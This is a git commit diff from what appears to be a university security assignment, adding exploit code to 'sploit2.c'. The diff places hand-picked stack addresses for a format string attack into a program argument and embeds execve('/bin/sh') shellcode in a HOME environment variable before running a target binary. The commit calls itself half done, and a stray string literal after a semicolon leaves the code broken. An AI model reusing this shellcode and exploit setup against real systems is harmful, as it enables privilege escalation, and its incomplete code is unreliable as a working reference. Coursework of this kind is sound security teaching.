7e31f87cafb7684020bca34dac314146ed25a982
Ron <ronngjianying@gmail.com>
2018-09-17 23:46:41 -0400

    Sploit2 halfway done
    Signed-off-by: Ron <ronngjianying@gmail.com>

--- Assignment 1/Codes/Sploits/sploit2.c
+++ Assignment 1/Codes/Sploits/sploit2.c
@@ -35,10 +35,19 @@ int main(int argc, char **argv)
 	fclose(payloadOutputFile);
 	
 
-	args[0] = "FORMATSTRINGHERE";  /*Format string attack here*/
+	/*Store addresses 0xffbfdd2c and 0xffbfdd2e onto the stack
+	  
+	
+	*/
+	args[0] = "\x2c\xdd\xbf\xff\x2e\xdd\xbf\xff";
+			  "AAAAAAAAA";
+			  
 	args[1] = "backup";
 	args[2] = NULL; args[3] = NULL;
-	env[0] = "HOME=/BLAHBLAHBLAH"; /*Address of this environment variable is 0xffbfdfaa*/
+	env[0] = "HOME=/"
+			  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+			  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+			  "\x80\xe8\xdc\xff\xff\xff/bin/sh"; /*Address of this environment variable is 0xffbfdfaa*/
 
 	if (execve(TARGET, args, env) < 0)
 		fprintf(stderr, "execve failed.\n");
